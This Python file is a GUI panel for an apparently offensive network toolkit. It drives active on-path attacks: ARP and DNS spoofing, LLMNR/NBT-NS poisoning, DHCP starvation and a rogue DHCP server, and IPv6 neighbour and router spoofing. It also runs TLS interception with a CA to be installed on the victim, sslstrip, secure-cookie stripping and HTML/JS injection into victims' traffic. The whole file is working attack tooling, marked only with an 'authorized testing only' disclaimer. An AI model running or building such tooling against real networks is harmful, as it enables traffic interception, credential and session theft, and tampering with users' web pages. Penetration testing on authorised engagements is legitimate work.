"""Active MITM controls: ARP spoof, DNS spoof, name-service poisoning.

Each section constructs a module and starts/stops its runner (root required).
For authorized testing only.
"""

from __future__ import annotations

from PySide6.QtWidgets import (
    QCheckBox,
    QComboBox,
    QFileDialog,
    QGroupBox,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPlainTextEdit,
    QPushButton,
    QSpinBox,
    QVBoxLayout,
    QWidget,
)

from reforge.capture.registry import list_interfaces


def _ifaces():
    return list_interfaces() or ["<none>"]


class AttacksPanel(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._arp = None
        self._dns = None
        self._name = None
        self._tls = None
        self._ca = None
        self._tcp = None
        self._dhcp = None
        self._ndp = None

        root = QVBoxLayout(self)
        note = QLabel("Active on-path attacks — authorized engagements only. Needs root.")
        note.setStyleSheet("color: palette(mid);")
        root.addWidget(note)
        root.addWidget(self._arp_box())
        root.addWidget(self._dns_box())
        root.addWidget(self._name_box())
        root.addWidget(self._dhcp_box())
        root.addWidget(self._ndp_box())
        root.addWidget(self._tls_box())
        root.addWidget(self._tcpproxy_box())
        root.addStretch(1)

    # ---- ARP ----------------------------------------------------------------
    def _arp_box(self) -> QGroupBox:
        box = QGroupBox("ARP cache poisoning (become the gateway)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.arp_if = QComboBox(); self.arp_if.addItems(_ifaces())
        self.arp_victim = QLineEdit(); self.arp_victim.setPlaceholderText("victim IP")
        self.arp_gw = QLineEdit(); self.arp_gw.setPlaceholderText("gateway IP")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._arp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._arp_stop)
        for w in (QLabel("Iface:"), self.arp_if, self.arp_victim, self.arp_gw, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.arp_status = QLabel("idle"); v.addWidget(self.arp_status)
        return box

    def _arp_start(self):
        from reforge.attacks.arp_spoof import ArpSpoofer

        self._arp_stop()
        self._arp = ArpSpoofer(self.arp_if.currentText(), self.arp_victim.text().strip(),
                               self.arp_gw.text().strip())
        try:
            ok = self._arp.start()
            self.arp_status.setText("poisoning…" if ok else "failed to resolve MACs (root? live net?)")
        except Exception as exc:
            self.arp_status.setText(f"error: {exc}")

    def _arp_stop(self):
        if self._arp:
            try:
                self._arp.stop()
            except Exception:
                pass
            self._arp = None
            self.arp_status.setText("stopped (restored)")

    # ---- DNS ----------------------------------------------------------------
    def _dns_box(self) -> QGroupBox:
        box = QGroupBox("DNS spoofing (forge answers)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.dns_if = QComboBox(); self.dns_if.addItems(_ifaces())
        b_start = QPushButton("Start"); b_start.clicked.connect(self._dns_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._dns_stop)
        for w in (QLabel("Iface:"), self.dns_if, b_start, b_stop):
            row.addWidget(w)
        row.addStretch(1)
        v.addLayout(row)
        self.dns_map = QPlainTextEdit()
        self.dns_map.setPlaceholderText("one mapping per line:  host=ip   (e.g. *.corp.local=10.0.0.66)")
        self.dns_map.setMaximumHeight(80)
        v.addWidget(self.dns_map)
        self.dns_status = QLabel("idle"); v.addWidget(self.dns_status)
        return box

    def _parse_map(self) -> dict:
        out = {}
        for line in self.dns_map.toPlainText().splitlines():
            if "=" in line:
                k, _, val = line.partition("=")
                out[k.strip().lower()] = val.strip()
        return out

    def _dns_start(self):
        from reforge.attacks.dns_spoof import DnsSpoofer

        self._dns_stop()
        hostmap = self._parse_map()
        if not hostmap:
            self.dns_status.setText("no mappings defined")
            return
        self._dns = DnsSpoofer(self.dns_if.currentText(), hostmap)
        try:
            self._dns.start()
            self.dns_status.setText(f"spoofing ({len(hostmap)} mappings)…")
        except Exception as exc:
            self.dns_status.setText(f"error: {exc}")

    def _dns_stop(self):
        if self._dns:
            try:
                self._dns.stop()
            except Exception:
                pass
            self._dns = None
            self.dns_status.setText("stopped")

    # ---- name poisoning -----------------------------------------------------
    def _name_box(self) -> QGroupBox:
        box = QGroupBox("Name poisoning (LLMNR / mDNS / NBT-NS)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.name_if = QComboBox(); self.name_if.addItems(_ifaces())
        self.name_ip = QLineEdit(); self.name_ip.setPlaceholderText("our IP (redirect target)")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._name_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._name_stop)
        for w in (QLabel("Iface:"), self.name_if, self.name_ip, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.name_status = QLabel("idle"); v.addWidget(self.name_status)
        return box

    def _name_start(self):
        from reforge.attacks.namepoison import NamePoisoner

        self._name_stop()
        self._name = NamePoisoner(self.name_if.currentText(), self.name_ip.text().strip())
        try:
            self._name.start()
            self.name_status.setText("poisoning name queries…")
        except Exception as exc:
            self.name_status.setText(f"error: {exc}")

    def _name_stop(self):
        if self._name:
            try:
                self._name.stop()
            except Exception:
                pass
            self._name = None
            self.name_status.setText("stopped")

    # ---- DHCP ---------------------------------------------------------------
    def _dhcp_box(self) -> QGroupBox:
        box = QGroupBox("DHCP — starvation / rogue server")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.dhcp_if = QComboBox(); self.dhcp_if.addItems(_ifaces())
        self.dhcp_mode = QComboBox(); self.dhcp_mode.addItems(["starvation", "rogue"])
        self.dhcp_server = QLineEdit(); self.dhcp_server.setPlaceholderText("rogue: server/gw/DNS IP")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._dhcp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._dhcp_stop)
        for w in (QLabel("Iface:"), self.dhcp_if, QLabel("Mode:"), self.dhcp_mode,
                  self.dhcp_server, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.dhcp_status = QLabel("idle"); v.addWidget(self.dhcp_status)
        return box

    def _dhcp_start(self):
        from reforge.attacks import dhcp

        self._dhcp_stop()
        iface = self.dhcp_if.currentText()
        try:
            if self.dhcp_mode.currentText() == "starvation":
                self._dhcp = dhcp.DhcpStarvation(iface)
            else:
                srv = self.dhcp_server.text().strip()
                if not srv:
                    self.dhcp_status.setText("rogue mode needs a server/gateway IP"); return
                self._dhcp = dhcp.RogueDhcp(iface, srv, gateway=srv, dns=srv)
            self._dhcp.start()
            self.dhcp_status.setText(f"{self.dhcp_mode.currentText()} running on {iface}…")
        except Exception as exc:
            self.dhcp_status.setText(f"error: {exc}")

    def _dhcp_stop(self):
        if self._dhcp:
            try:
                self._dhcp.stop()
            except Exception:
                pass
            self._dhcp = None
            self.dhcp_status.setText("stopped")

    # ---- NDP (IPv6) ---------------------------------------------------------
    def _ndp_box(self) -> QGroupBox:
        box = QGroupBox("NDP / IPv6 — NA spoof / rogue RA")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.ndp_if = QComboBox(); self.ndp_if.addItems(_ifaces())
        self.ndp_mode = QComboBox(); self.ndp_mode.addItems(["na-spoof", "rogue-ra"])
        self.ndp_target = QLineEdit(); self.ndp_target.setPlaceholderText("target IPv6 (na)")
        self.ndp_victim = QLineEdit(); self.ndp_victim.setPlaceholderText("victim IPv6 (na)")
        self.ndp_mac = QLineEdit(); self.ndp_mac.setPlaceholderText("our MAC")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._ndp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._ndp_stop)
        for w in (QLabel("Iface:"), self.ndp_if, self.ndp_mode, self.ndp_target,
                  self.ndp_victim, self.ndp_mac, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        self.ndp_status = QLabel("idle"); v.addWidget(self.ndp_status)
        return box

    def _ndp_start(self):
        from reforge.attacks import ndp

        self._ndp_stop()
        iface = self.ndp_if.currentText()
        mac = self.ndp_mac.text().strip()
        try:
            if self.ndp_mode.currentText() == "na-spoof":
                self._ndp = ndp.NdpSpoofer(iface, self.ndp_target.text().strip(),
                                           self.ndp_victim.text().strip(), mac)
            else:
                self._ndp = ndp.RogueRouter(iface, mac)
            self._ndp.start()
            self.ndp_status.setText(f"{self.ndp_mode.currentText()} running on {iface}…")
        except Exception as exc:
            self.ndp_status.setText(f"error: {exc}")

    def _ndp_stop(self):
        if self._ndp:
            try:
                self._ndp.stop()
            except Exception:
                pass
            self._ndp = None
            self.ndp_status.setText("stopped")

    # ---- TLS interception ---------------------------------------------------
    def _tls_box(self) -> QGroupBox:
        box = QGroupBox("TLS interception (certificate-injection MITM)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.tls_port = QSpinBox(); self.tls_port.setRange(1, 65535); self.tls_port.setValue(8443)
        b_start = QPushButton("Start"); b_start.clicked.connect(self._tls_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._tls_stop)
        b_ca = QPushButton("Export CA cert"); b_ca.clicked.connect(self._tls_export_ca)
        self.tls_rewrite = QCheckBox("apply HTTP rewrite")
        self.tls_rewrite.setToolTip("Run the TCP-proxy HTTP transforms on decrypted HTTPS")
        for w in (QLabel("Listen port:"), self.tls_port, b_start, b_stop, b_ca, self.tls_rewrite):
            row.addWidget(w)
        row.addStretch(1)
        v.addLayout(row)
        self.tls_status = QLabel("idle — redirect victim 443→listen port and install the CA")
        v.addWidget(self.tls_status)
        return box

    def _ensure_ca(self):
        from reforge.attacks.tls_ca import DynamicCA

        if self._ca is None:
            self._ca = DynamicCA()
        return self._ca

    def _tls_start(self):
        from reforge.attacks.tls_proxy import TlsInterceptor

        self._tls_stop()
        ca = self._ensure_ca()
        transforms = self._build_http_transforms() if self.tls_rewrite.isChecked() else None
        self._tls = TlsInterceptor(ca, listen=("0.0.0.0", self.tls_port.value()),
                                   http_transforms=transforms)
        try:
            port = self._tls.start()
            extra = f" + HTTP rewrite ({len(transforms)})" if transforms else ""
            self.tls_status.setText(f"intercepting on :{port}{extra} — export + install "
                                    f"the CA, redirect 443→{port}")
        except Exception as exc:
            self.tls_status.setText(f"error: {exc}")

    def _tls_stop(self):
        if self._tls:
            try:
                self._tls.stop()
            except Exception:
                pass
            self._tls = None
            self.tls_status.setText("stopped")

    def _tls_export_ca(self):
        path, _ = QFileDialog.getSaveFileName(self, "Export CA certificate",
                                              "reforge-ca.pem", "PEM (*.pem *.crt)")
        if not path:
            return
        self._ensure_ca().write_ca(path)
        self.tls_status.setText(f"CA written to {path} — install it on the victim as trusted root")

    # ---- TCP proxy (HTTP rewrite, large bodies) -----------------------------
    def _tcpproxy_box(self) -> QGroupBox:
        box = QGroupBox("TCP proxy — HTTP rewrite across full/large bodies (R2)")
        v = QVBoxLayout(box)
        row = QHBoxLayout()
        self.tp_port = QSpinBox(); self.tp_port.setRange(1, 65535); self.tp_port.setValue(8080)
        self.tp_target = QLineEdit(); self.tp_target.setPlaceholderText("upstream host:port (blank = SO_ORIGINAL_DST)")
        b_start = QPushButton("Start"); b_start.clicked.connect(self._tcp_start)
        b_stop = QPushButton("Stop"); b_stop.clicked.connect(self._tcp_stop)
        for w in (QLabel("Listen:"), self.tp_port, QLabel("Upstream:"), self.tp_target, b_start, b_stop):
            row.addWidget(w)
        v.addLayout(row)
        row2 = QHBoxLayout()
        self.tp_sslstrip = QCheckBox("sslstrip")
        self.tp_stripenc = QCheckBox("strip-encoding"); self.tp_stripenc.setChecked(True)
        self.tp_cookie = QCheckBox("strip-cookie")
        self.tp_inject = QLineEdit(); self.tp_inject.setPlaceholderText("inject HTML/JS before </body> (optional)")
        for w in (self.tp_sslstrip, self.tp_stripenc, self.tp_cookie, QLabel("Inject:"), self.tp_inject):
            row2.addWidget(w)
        v.addLayout(row2)
        self.tp_status = QLabel("idle — redirect victim HTTP → listen port")
        v.addWidget(self.tp_status)
        return box

    def _build_http_transforms(self) -> list:
        from reforge.attacks import tcp_proxy

        transforms = []
        if self.tp_sslstrip.isChecked():
            transforms.append(tcp_proxy.sslstrip())
        if self.tp_stripenc.isChecked():
            transforms.append(tcp_proxy.strip_accept_encoding())
        if self.tp_cookie.isChecked():
            transforms.append(tcp_proxy.strip_secure_cookie())
        if self.tp_inject.text().strip():
            transforms.append(tcp_proxy.inject(self.tp_inject.text().encode()))
        return transforms

    def _tcp_start(self):
        from reforge.attacks import tcp_proxy

        self._tcp_stop()
        target = self.tp_target.text().strip()
        if target:
            host, _, port = target.partition(":")
            resolver = (lambda c, h=host, p=int(port or 80): (h, p))
        else:
            resolver = (lambda c: tcp_proxy.so_original_dst(c) or ("127.0.0.1", 80))

        transforms = self._build_http_transforms()
        self._tcp = tcp_proxy.TcpProxy(resolver, http_transforms=transforms,
                                       listen=("0.0.0.0", self.tp_port.value()))
        try:
            port = self._tcp.start()
            self.tp_status.setText(f"proxying on :{port} ({len(transforms)} transform(s))")
        except Exception as exc:
            self.tp_status.setText(f"error: {exc}")

    def _tcp_stop(self):
        if self._tcp:
            try:
                self._tcp.stop()
            except Exception:
                pass
            self._tcp = None
            self.tp_status.setText("stopped")

    def stop_all(self):
        self._arp_stop(); self._dns_stop(); self._name_stop()
        self._dhcp_stop(); self._ndp_stop()
        self._tls_stop(); self._tcp_stop()
